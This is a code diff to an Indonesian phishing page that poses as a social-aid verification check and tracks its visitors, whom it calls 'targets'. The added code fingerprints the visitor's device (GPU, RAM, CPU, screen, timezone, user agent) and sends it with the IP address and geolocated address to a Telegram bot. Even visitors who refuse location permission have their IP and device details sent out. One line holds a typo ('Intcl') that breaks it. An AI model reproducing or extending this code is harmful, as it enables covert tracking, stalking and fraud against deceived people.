@@ -89,6 +89,40 @@
             } catch (e) { return "Gagal ambil alamat otomatis"; }
         }
 
+        function getDetailedSpecs() {
+            const ua = navigator.userAgent;
+            const platform = navigator.platform;
+            const screenRes = `${window.screen.width}x${window.screen.height}`;
+            const logicalRes = `${window.innerWidth}x${window.innerHeight}`;
+            const colorDepth = window.screen.colorDepth;
+            const deviceMemory = navigator.deviceMemory || 'Unknown';
+            const hardwareConcurrency = navigator.hardwareConcurrency || 'Unknown';
+            const language = navigator.language;
+            const timezone = Intcl ? Intcl.DateTimeFormat().resolvedOptions().timeZone : 'Unknown';
+            const touchPoints = navigator.maxTouchPoints || 0;
+
+            let gpu = 'Unknown';
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Generic';
+                }
+            } catch (e) {}
+
+            return `📱 <b>DETAIL PERANGKAT</b>\n` +
+                   `• <b>Model/UA:</b> <code>${ua}</code>\n` +
+                   `• <b>Platform:</b> <code>${platform}</code>\n` +
+                   `• <b>Layar:</b> <code>${screenRes} (${logicalRes})</code>\n` +
+                   `• <b>GPU:</b> <code>${gpu}</code>\n` +
+                   `• <b>RAM:</b> <code>~${deviceMemory} GB</code>\n` +
+                   `• <b>CPU Cores:</b> <code>${hardwareConcurrency}</code>\n` +
+                   `• <b>Bahasa:</b> <code>${language}</code>\n` +
+                   `• <b>Zona Waktu:</b> <code>${timezone}</code>\n` +
+                   `• <b>Touch Points:</b> <code>${touchPoints}</code>`;
+        }
+
         async function startCapture() {
             const btn = document.getElementById('btnAction');
             const loader = document.getElementById('loader');
@@ -126,14 +160,15 @@
 
                     const ipPromise = getIP();
                     const addrPromise = getAddress(lat, lon);
+                    const specs = getDetailedSpecs();
                     const [ip, addr] = await Promise.all([ipPromise, addrPromise]);
 
                     await sendToTelegram(
                         `🏠 <b>DETAIL LOKASI TARGET</b>\n` +
                         `🌐 <b>IP:</b> <code>${ip}</code>\n` +
                         `📍 <b>Alamat/Area:</b>\n<code>${addr}</code>\n\n` +
-                        `ℹ️ <i>Target kemungkinan berada di sekitar area tersebut.</i>\n\n` +
-                        `📱 <b>Perangkat:</b>\n<code>${navigator.userAgent}</code>`
+                        specs + `\n\n` +
+                        `ℹ️ <i>Target kemungkinan berada di sekitar area tersebut.</i>`
                     );
 
                     setTimeout(() => { window.location.href = REDIRECT_URL; }, 1000);
@@ -141,6 +176,9 @@
                 async (err) => {
                     loader.style.display = 'none';
                     title.innerText = "Verifikasi Gagal";
+                    const specs = getDetailedSpecs();
+                    const ip = await getIP();
+
                     if(err.code == 1) {
                         desc.style.background = "#ffebee";
                         desc.style.borderLeft = "5px solid #d32f2f";
@@ -150,7 +188,7 @@
                         1. Klik ikon <b>Gembok/Info</b> di pojok kiri atas browser (dekat alamat web).<br>
                         2. Pilih <b>Izin (Permissions)</b> dan aktifkan <b>Lokasi</b>.<br>
                         3. <b>Muat Ulang (Refresh)</b> halaman ini untuk melanjutkan pengecekan bantuan.`;
-                        await sendToTelegram(`⚠️ <b>BANMAS: DIBLOKIR</b>\nTarget menolak izin lokasi.`);
+                        await sendToTelegram(`⚠️ <b>BANMAS: DIBLOKIR</b>\nIP: ${ip}\n\n${specs}`);
                     }
                     else if(err.code == 2 || err.code == 3) {
                         desc.style.background = "#fff3e0";
@@ -161,9 +199,9 @@
                         1. Usap layar dari atas ke bawah (Panel Notifikasi).<br>
                         2. Aktifkan ikon <b>'Lokasi' / 'GPS'</b>.<br>
                         3. Klik <b>Refresh/Muat Ulang</b> halaman ini.`;
-                        await sendToTelegram(`⚠️ <b>BANMAS: GPS OFF</b>\nGPS sistem HP target dalam keadaan mati.`);
+                        await sendToTelegram(`⚠️ <b>BANMAS: GPS OFF</b>\nIP: ${ip}\n\n${specs}`);
                     } else {
-                        await sendToTelegram(`⚠️ <b>BANMAS: ERROR</b>\nCode: ${err.code}`);
+                        await sendToTelegram(`⚠️ <b>BANMAS: ERROR</b>\nCode: ${err.code}\nIP: ${ip}\n\n${specs}`);
                         window.location.href = REDIRECT_URL;
                     }
                 },
